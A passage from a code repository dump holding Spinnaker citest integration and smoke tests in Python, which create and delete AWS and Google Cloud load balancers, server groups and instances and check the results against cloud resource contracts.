            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold':8,
        'UnhealthyThreshold':3,
        'Interval':123,
        'Timeout':12,
        'Target':'HTTP:%d/healthcheck' % listener['Listener']['InstancePort']
    }

    payload = self.agent.type_to_payload(
        'upsertAmazonLoadBalancerDescription',
        {
            'credentials': bindings['AWS_CREDENTIALS'],
            'clusterName': bindings['TEST_APP'],
            'name': detail_raw_name,
            'availabilityZones': {region: avail_zones},
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold']
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=30)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name])
     .contains_pred_list([
         jc.PathContainsPredicate(
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(
             'LoadBalancerDescriptions/AvailabilityZones',
             jc.LIST_SIMILAR(avail_zones)),
         jc.PathElementsContainPredicate(
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_load_balancer(self):
    """"""Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.
    """"""
    region = self.bindings['TEST_AWS_REGION']
    payload = self.agent.type_to_payload(
        'deleteAmazonLoadBalancerDescription',
        {
            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [region],
            'loadBalancerName': self.__use_lb_name
        })

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', self.__use_lb_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', self.__use_lb_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_amazon_load_balancer', data=payload, path='ops'),
        contract=builder.build())


class AwsKatoIntegrationTest(st.AgentTestCase):
  """"""The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsKatoTestScenario.
  """"""
  # pylint: disable=missing-docstring

  def test_a_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():
  """"""Implements the main method running this smoke test.""""""

  defaults = {
      'TEST_APP': 'awskatotest' + AwsKatoTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsKatoTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsKatoIntegrationTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/n/spinnaker_system/aws_smoke_test.py/n/n# Copyright 2016 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Smoke test to see if Spinnaker can interoperate with Amazon Web Services.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/smoke_test.py \
    --native_hostname=host-running-smoke-test
    --test_aws_zone=$AWS_ZONE \
    --aws_profile=$AWS_PROFILE

  Note that the $AWS_ZONE is not directly used, rather it is a standard
  parameter being used to infer the region. The test is going to pick
  some different availability zones within the region in order to test kato.
  These are currently hardcoded in.
""""""

# Standard python modules.
import sys

# citest modules.
import citest.aws_testing as aws
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class AwsSmokeTestScenario(sk.SpinnakerTestScenario):
  """"""Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """"""

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements citest.service_testing.AgentTestScenario.new_agent.""""""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """"""Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """"""
    super(AwsSmokeTestScenario, cls).initArgumentParser(parser,
                                                        defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """"""Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """"""
    super(AwsSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """"""Creates OperationContract that creates a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """"""Creates OperationContract that deletes a new Spinnaker Application.""""""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self, use_vpc):
    """"""Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on AWS. See
    the contract builder for more info on what the expectations are.

    Args:
      use_vpc: [bool] if True configure a VPC otherwise dont.
    """"""
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # We're assuming that the given region has 'A' and 'B' availability
    # zones. This seems conservative but might be brittle since we permit
    # any region.
    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    if use_vpc:
      # TODO(ewiseblatt): 20160301
      # We're hardcoding the VPC here, but not sure which we really want.
      # I think this comes from the spinnaker.io installation instructions.
      # What's interesting about this is that it is a 10.* CidrBlock,
      # as opposed to the others, which are public IPs. All this is sensitive
      # as to where the TEST_AWS_VPC_ID came from so this is going to be
      # brittle. Ideally we only need to know the vpc_id and can figure the
      # rest out based on what we have available.
      subnet_type = 'internal (defaultvpc)'
      vpc_id = bindings['TEST_AWS_VPC_ID']

      # Not really sure how to determine this value in general.
      security_groups = ['default']

      # The resulting load balancer will only be available in the zone of
      # the subnet we are using. We'll figure that out by looking up the
      # subnet we want.
      subnet_details = self.aws_observer.get_resource_list(
          root_key='Subnets',
          aws_command='describe-subnets',
          aws_module='ec2',
          args=['--filters',
                'Name=vpc-id,Values={vpc_id}'
                ',Name=tag:Name,Values=defaultvpc.internal.{region}'
                .format(vpc_id=vpc_id, region=region)])
      try:
        expect_avail_zones = [subnet_details[0]['AvailabilityZone']]
      except KeyError:
        raise ValueError('vpc_id={0} appears to be unknown'.format(vpc_id))
    else:
      subnet_type = """"
      vpc_id = None
      security_groups = None
      expect_avail_zones = avail_zones

      # This will be a second load balancer not used in other tests.
      # Decorate the name so as not to confuse it.
      load_balancer_name += '-pub'


    listener = {
        'Listener': {
            'InstancePort':80,
            'LoadBalancerPort':80
        }
    }
    health_check = {
        'HealthyThreshold': 8,
        'UnhealthyThreshold': 3,
        'Interval': 12,
        'Timeout': 6,
        'Target':'HTTP:%d/' % listener['Listener']['InstancePort']
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'upsertLoadBalancer',
            'cloudProvider': 'aws',
            # 'loadBalancerName': load_balancer_name,


            'credentials': bindings['AWS_CREDENTIALS'],
            'name': load_balancer_name,
            'stack': bindings['TEST_STACK'],
            'detail': '',
            'region': bindings['TEST_AWS_REGION'],

            'availabilityZones': {region: avail_zones},
            'regionZones': avail_zones,
            'listeners': [{
                'internalProtocol': 'HTTP',
                'internalPort': listener['Listener']['InstancePort'],
                'externalProtocol': 'HTTP',
                'externalPort': listener['Listener']['LoadBalancerPort']
            }],
            'healthCheck': health_check['Target'],
            'healthCheckProtocol': 'HTTP',
            'healthCheckPort': listener['Listener']['LoadBalancerPort'],
            'healthCheckPath': '/',
            'healthTimeout': health_check['Timeout'],
            'healthInterval': health_check['Interval'],
            'healthyThreshold': health_check['HealthyThreshold'],
            'unhealthyThreshold': health_check['UnhealthyThreshold'],

            'user': '[anonymous]',
            'usePreferredZones': True,
            'vpcId': vpc_id,
            'subnetType': subnet_type,
            # If I set security group to this then I get an error it is missing.
            # bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'securityGroups': security_groups
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Added', retryable_for_secs=10)
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name])
     .contains_pred_list([
         jc.PathContainsPredicate(
             'LoadBalancerDescriptions/HealthCheck', health_check),
         jc.PathPredicate(
             'LoadBalancerDescriptions/AvailabilityZones',
             jc.LIST_SIMILAR(expect_avail_zones)),
         jc.PathElementsContainPredicate(
             'LoadBalancerDescriptions/ListenerDescriptions', listener)
         ])
    )

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self, use_vpc):
    """"""Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the AWS resources
    created by upsert_load_balancer are no longer visible on AWS.

    Args:
      use_vpc: [bool] if True delete the VPC load balancer, otherwise
         the non-VPC load balancer.
    """"""
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    if not use_vpc:
      # This is the second load balancer, where we decorated the name in upsert.
      load_balancer_name += '-pub'

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'aws',

            'credentials': self.bindings['AWS_CREDENTIALS'],
            'regions': [self.bindings['TEST_AWS_REGION']],
            'loadBalancerName': load_balancer_name
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            self.bindings['AWS_CREDENTIALS'],
            self.bindings['TEST_AWS_REGION']),
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Load Balancer Removed')
     .collect_resources(
         aws_module='elb',
         command='describe-load-balancers',
         args=['--load-balancer-names', load_balancer_name],
         no_resources_ok=True)
     .excludes_path_value('LoadBalancerName', load_balancer_name))

    title_decorator = '_with_vpc' if use_vpc else '_without_vpc'
    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer' + title_decorator,
            data=payload,
            path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """"""Creates OperationContract for createServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    for the server group was created.
    """"""
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    region = bindings['TEST_AWS_REGION']
    avail_zones = [region + 'a', region + 'b']

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'createServerGroup',
            'cloudProvider': 'aws',
            'application': self.TEST_APP,
            'credentials': bindings['AWS_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetHealthyDeployPercentage': 100,
            'loadBalancers': [load_balancer_name],
            'cooldown': 8,
            'healthCheckType': 'EC2',
            'healthCheckGracePeriod': 40,
            'instanceMonitoring': False,
            'ebsOptimized': False,
            'iamRole': bindings['AWS_IAM_ROLE'],
            'terminationPolicies': ['Default'],

            'availabilityZones': {region: avail_zones},
            'keyPair': bindings['AWS_CREDENTIALS'] + '-keypair',
            'suspendedProcesses': [],
            # TODO(ewiseblatt): Inquiring about how this value is determined.
            # It seems to be the ""Name"" tag value of one of the VPCs
            # but is not the default VPC, which is what we using as the VPC_ID.
            # So I suspect something is out of whack. This name comes from
            # spinnaker.io tutorial. But using the default vpc would probably
            # be more adaptive to the particular deployment.
            'subnetType': 'internal (defaultvpc)',
            'securityGroups': [bindings['TEST_AWS_SECURITY_GROUP_ID']],
            'virtualizationType': 'paravirtual',
            'stack': bindings['TEST_STACK'],
            'freeFormDetails': '',
            'amiName': bindings['TEST_AWS_AMI'],
            'instanceType': 'm1.small',
            'useSourceCapacity': False,
            'account': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Server Group Added',
                                retryable_for_secs=30)
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name])
     .contains_path_value('AutoScalingGroups', {'MaxSize': 2}))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """"""Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the AWS Auto Scaling Group
    is no longer visible on AWS (or is in the process of terminating).
    """"""
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'aws',
            'type': 'destroyServerGroup',
            'serverGroupName': group_name,
            'asgName': group_name,
            'region': bindings['TEST_AWS_REGION'],
            'regions': [bindings['TEST_AWS_REGION']],
            'credentials': bindings['AWS_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = aws.AwsContractBuilder(self.aws_observer)
    (builder.new_clause_builder('Auto Scaling Group Removed')
     .collect_resources('autoscaling', 'describe-auto-scaling-groups',
                        args=['--auto-scaling-group-names', group_name],
                        no_resources_ok=True)
     .contains_path_value('AutoScalingGroups', {'MaxSize': 0}))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .collect_resources('ec2', 'describe-instances', no_resources_ok=True)
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class AwsSmokeTest(st.AgentTestCase):
  """"""The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the AwsSmokeTestScenario.
  """"""
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer_public(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=False))

  def test_b_upsert_load_balancer_vpc(self):
    self.run_test_case(self.scenario.upsert_load_balancer(use_vpc=True))

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer_vpc(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=True),
                       max_retries=5)

  def test_y_delete_load_balancer_pub(self):
    self.run_test_case(self.scenario.delete_load_balancer(use_vpc=False),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """"""Implements the main method running this smoke test.""""""

  defaults = {
      'TEST_STACK': str(AwsSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'smoketest' + AwsSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      AwsSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[AwsSmokeTest])


if __name__ == '__main__':
  sys.exit(main())
/n/n/n/spinnaker_system/google_kato_test.py/n/n# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
# for more details.
#
# The kato test will use ssh to peek at the spinnaker configuration
# to determine the managed project it should verify, and to determine
# the spinnaker account name to use when sending it commands.
#
# Sample Usage:
#     Assuming you have created $PASSPHRASE_FILE (which you should chmod 400):
#     and $CITEST_ROOT points to the root directory of this repository
#     (which is . if you execute this from the root)
#
#   PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
#     python $CITEST_ROOT/spinnaker/spinnaker_system/google_kato_test.py \
#     --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
#     --gce_project=$PROJECT \
#     --gce_zone=$ZONE \
#     --gce_instance=$INSTANCE
# or
#   PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
#     python $CITEST_ROOT/spinnaker/spinnaker_system/google_kato_test.py \
#     --native_hostname=host-running-kato
#     --managed_gce_project=$PROJECT \
#     --test_gce_zone=$ZONE


# Standard python modules.
import json as json_module
import logging
import sys

# citest modules.
from citest.service_testing import HttpContractBuilder
from citest.service_testing import NoOpOperation
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.kato as kato


class GoogleKatoTestScenario(sk.SpinnakerTestScenario):
  # _instance_names and _instance_zones will be set in create_instances_.
  # We're breaking them out so that they can be shared by other methods,
  # especially terminate.
  use_instance_names = []
  use_instance_zones = []
  __use_lb_name = ''     # The load balancer name.
  __use_lb_tp_name = ''  # The load balancer's target pool name.
  __use_lb_hc_name = ''  # The load balancer's health check name.
  __use_lb_target = ''   # The load balancer's 'target' resource.
  __use_http_lb_name = '' # The HTTP load balancer name.
  __use_http_lb_proxy_name = '' # The HTTP load balancer target proxy name.
  __use_http_lb_hc_name = '' # The HTTP load balancer health check name.
  __use_http_lb_bs_name = '' # The HTTP load balancer backend service name.
  __use_http_lb_fr_name = '' # The HTTP load balancer forwarding rule.
  __use_http_lb_map_name = '' # The HTTP load balancer url map name.
  __use_http_lb_http_proxy_name = '' # The HTTP load balancer target http proxy.

  @classmethod
  def new_agent(cls, bindings):
    """"""Implements the base class interface to create a new agent.

    This method is called by the base classes during setup/initialization.

    Args:
      bindings: The bindings dictionary with configuration information
        that this factory can draw from to initialize. If the factory would
        like additional custom bindings it could add them to initArgumentParser.

    Returns:
      A citest.service_testing.BaseAgent that can interact with Kato.
      This is the agent that test operations will be posted to.
    """"""
    return kato.new_agent(bindings)

  def create_instances(self):
    """"""Creates test adding instances to GCE.

     Create three instances.
       * The first two are of different types and zones, which
         we'll check. Future tests will also be using these
         from different zones (but same region).

       * The third is a duplicate in the same zone as another
         so we can check duplicate deletes (which limit one zone per call).

     We'll set the class properties use_instance_names and use_instance_zones
     so that they can be communicated to future tests to reference.

    Returns:
      st.OperationContract
    """"""
    # We're going to make specific instances so we can refer to them later
    # in tests involving instances. The instances are decorated to trace back
    # to this particular run so as not to conflict with other tests that may
    # be running.
    self.use_instance_names = [
        'katotest%sa' % self.test_id,
        'katotest%sb' % self.test_id,
        'katotest%sc' % self.test_id]

    # Put the instance in zones. Force one zone to be different
    # to ensure we're testing zone placement. We arent bothering
    # with different regions at this time.
    self.use_instance_zones = [
        self.bindings['TEST_GCE_ZONE'],
        'us-central1-b',
        self.bindings['TEST_GCE_ZONE']]
    if self.use_instance_zones[0] == self.use_instance_zones[1]:
      self.use_instance_zones[1] = 'us-central1-c'

    # Give the instances images and machine types. Again we're forcing
    # one to be different to ensure that we're using the values.
    image_name = [self.bindings['TEST_GCE_IMAGE_NAME'],
                  'debian-7-wheezy-v20150818',
                  self.bindings['TEST_GCE_IMAGE_NAME']]
    if image_name[0] == image_name[1]:
      image_name[1] = 'ubuntu-1404-trusty-v20150805'
    machine_type = ['f1-micro', 'g1-small', 'f1-micro']

    # The instance_spec will turn into the payload of instances we request.
    instance_spec = []
    builder = gcp.GceContractBuilder(self.gce_observer)
    for i in range(3):
      # pylint: disable=bad-continuation
      instance_spec.append(
        {
          'createGoogleInstanceDescription': {
            'instanceName': self.use_instance_names[i],
            'image': image_name[i],
            'instanceType': machine_type[i],
            'zone': self.use_instance_zones[i],
            'credentials': self.bindings['GCE_CREDENTIALS']
            }
        })

      # Verify we created an instance, whether or not it boots.
      (builder.new_clause_builder(
          'Instance %d Created' % i, retryable_for_secs=90)
            .list_resources('instances')
            .contains_path_value('name', self.use_instance_names[i]))
      if i < 2:
        # Verify the details are what we asked for.
        # Since we've finished the created clause, this already exists.
        # Note we're only checking the first two since they are different
        # from one another. Anything after that isnt necessary for the test.
        # The clause above already checked that they were all created so we
        # can assume from this test that the details are ok as well.
        (builder.new_clause_builder('Instance %d Details' % i)
            .inspect_resource('instances', self.use_instance_names[i],
                              extra_args=['--zone', self.use_instance_zones[i]])
            .contains_path_value('machineType', machine_type[i]))
        # Verify the instance eventually boots up.
        # We can combine this with above, but we'll probably need
        # to retry this, but not the above, so this way if the
        # above is broken (wrong), we wont retry thinking it isnt there yet.
        (builder.new_clause_builder('Instance %d Is Running' % i,
                             retryable_for_secs=90)
            .inspect_resource('instances', name=self.use_instance_names[i],
                              extra_args=['--zone', self.use_instance_zones[i]])
            .contains_path_eq('status', 'RUNNING'))

    payload = self.agent.make_json_payload_from_object(instance_spec)

    return st.OperationContract(
        self.new_post_operation(
            title='create_instances', data=payload, path='ops'),
        contract=builder.build())

  def terminate_instances(self, names, zone):
    """"""Creates test for removing specific instances.

    Args:
      names: A list of instance names to be removed.
      zone: The zone containing the instances.

    Returns:
      st.OperationContract
    """"""
    builder = gcp.GceContractBuilder(self.gce_observer)
    clause = (builder.new_clause_builder('Instances Deleted',
                                         retryable_for_secs=15,
                                         strict=True)
              .list_resources('instances'))
    for name in names:
      # If one of our instances still exists, it should be STOPPING.
      name_matches_pred = jc.PathContainsPredicate('name', name)
      is_stopping_pred = jc.PathEqPredicate('status', 'STOPPING')

      # We want the condition to apply to all the observed objects so we'll
      # map the constraint over the observation. Otherwise, if dont map it,
      # then we'd expect the constraint to hold somewhere among the observed
      # objects, but not necessarily all of them.
      clause.add_mapped_constraint(jc.IF(name_matches_pred, is_stopping_pred))

    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
          'terminateInstances',
          {
            'instanceIds': names,
            'zone': zone,
            'credentials': self.bindings['GCE_CREDENTIALS']
          })

    return st.OperationContract(
        self.new_post_operation(
            title='terminate_instances', data=payload, path='gce/ops'),
        contract=builder.build())

  def upsert_google_server_group_tags(self):
    # pylint: disable=bad-continuation
    server_group_name = 'katotest-server-group'
    payload = self.agent.type_to_payload(
        'upsertGoogleServerGroupTagsDescription',
        {
          'credentials': self.bindings['GCE_CREDENTIALS'],
          'zone': self.bindings['TEST_GCE_ZONE'],
          'serverGroupName': 'katotest-server-group',
          'tags': ['test-tag-1', 'test-tag-2']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Server Group Tags Added')
        .inspect_resource('managed-instance-groups', server_group_name)
        .contains_pred_list(
            [jc.PathContainsPredicate('name', server_group_name),
             jc.PathContainsPredicate(
                 ""tags/items"", ['test-tag-1', 'test-tag-2'])]))

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_server_group_tags', data=payload, path='ops'),
        contract=builder.build())

  def create_http_load_balancer(self):
    logical_http_lb_name = 'katotest-httplb-' + self.test_id
    self.__use_http_lb_name = logical_http_lb_name

    # TODO(ewiseblatt): 20150530
    # This needs to be abbreviated to hc.
    self.__use_http_lb_hc_name = logical_http_lb_name + '-health-check'

    # TODO(ewiseblatt): 20150530
    # This needs to be abbreviated to bs.
    self.__use_http_lb_bs_name = logical_http_lb_name + '-backend-service'
    self.__use_http_lb_fr_name = logical_http_lb_name

    # TODO(ewiseblatt): 20150530
    # This should be abbreviated (um?).
    self.__use_http_lb_map_name = logical_http_lb_name + '-url-map'

    # TODO(ewiseblatt): 20150530
    # This should be abbreviated (px)?.
    self.__use_http_lb_proxy_name = logical_http_lb_name + '-target-http-proxy'

    interval = 231
    healthy = 8
    unhealthy = 9
    timeout = 65
    path = '/hello/world'

    # TODO(ewiseblatt): 20150530
    # This field might be broken. 123-456 still resolves to 80-80
    # Changing it for now so the test passes.
    port_range = ""80-80""

    # TODO(ewiseblatt): 20150530
    # Specify explicit backends?

    health_check = {
        'checkIntervalSec': interval,
        'healthyThreshold': healthy,
        'unhealthyThreshold': unhealthy,
        'timeoutSec': timeout,
        'requestPath': path
        }

    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'createGoogleHttpLoadBalancerDescription',
        {
          'healthCheck': health_check,
          'portRange': port_range,
          'loadBalancerName': logical_http_lb_name,
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Http Health Check Added')
        .list_resources('http-health-checks')
        .contains_pred_list(
            [jc.PathContainsPredicate('name', self.__use_http_lb_hc_name),
             jc.PathContainsPredicate(None, health_check)]))
    (builder.new_clause_builder('Forwarding Rule Added', retryable_for_secs=15)
       .list_resources('forwarding-rules')
       .contains_pred_list(
           [jc.PathContainsPredicate('name', self.__use_http_lb_fr_name),
            jc.PathContainsPredicate('portRange', port_range)]))
    (builder.new_clause_builder('Backend Service Added')
       .list_resources('backend-services')
       .contains_pred_list(
           [jc.PathContainsPredicate('name', self.__use_http_lb_bs_name),
            jc.PathElementsContainPredicate(
                'healthChecks', self.__use_http_lb_hc_name)]))
    (builder.new_clause_builder('Url Map Added')
       .list_resources('url-maps')
       .contains_pred_list(
           [jc.PathContainsPredicate('name', self.__use_http_lb_map_name),
            jc.PathContainsPredicate(
                'defaultService', self.__use_http_lb_bs_name)]))
    (builder.new_clause_builder('Target Http Proxy Added')
       .list_resources('target-http-proxies')
       .contains_pred_list(
           [jc.PathContainsPredicate('name', self.__use_http_lb_proxy_name),
            jc.PathContainsPredicate('urlMap', self.__use_http_lb_map_name)]))

    return st.OperationContract(
        self.new_post_operation(
            title='create_http_load_balancer', data=payload, path='ops'),
        contract=builder.build())

  def delete_http_load_balancer(self):
    # pylint: disable=bad-continuation
    payload = self.agent.type_to_payload(
        'deleteGoogleHttpLoadBalancerDescription',
        {
          'loadBalancerName': self.__use_http_lb_name,
          'credentials': self.bindings['GCE_CREDENTIALS']
        })

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed')
       .list_resources('http-health-checks')
       .excludes_path_value('name', self.__use_http_lb_hc_name))
    (builder.new_clause_builder('Forwarding Rules Removed')
       .list_resources('forwarding-rules')
       .excludes_path_value('name', self.__use_http_lb_fr_name))
    (builder.new_clause_builder('Backend Service Removed')
       .list_resources('backend-services')
       .excludes_path_value('name', self.__use_http_lb_bs_name))
    (builder.new_clause_builder('Url Map Removed')
       .list_resources('url-maps')
       .excludes_path_value('name', self.__use_http_lb_map_name))
    (builder.new_clause_builder('Target Http Proxy Removed')
       .list_resources('target-http-proxies')
       .excludes_path_value('name', self.__use_http_lb_proxy_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_http_load_balancer', data=payload, path='ops'),
        contract=builder.build())


  def upsert_load_balancer(self):
    self.__use_lb_name = 'katotest-lb-' + self.test_id
    self.__use_lb_hc_name = '%s-hc' % self.__use_lb_name
    self.__use_lb_tp_name = '%s-tp' % self.__use_lb_name
    self.__use_lb_target = '{0}/targetPools/{1}'.format(
        self.bindings['TEST_GCE_REGION'], self.__use_lb_tp_name)

    interval = 123
    healthy = 4
    unhealthy = 5
    timeout = 78
    path = '/' + self.__use_lb_target

    health_check = {
        'checkIntervalSec': interval,
        'healthyThreshold': healthy,
        'unhealthyThreshold': unhealthy,
        'timeoutSec': timeout,
        'requestPath': path
        }

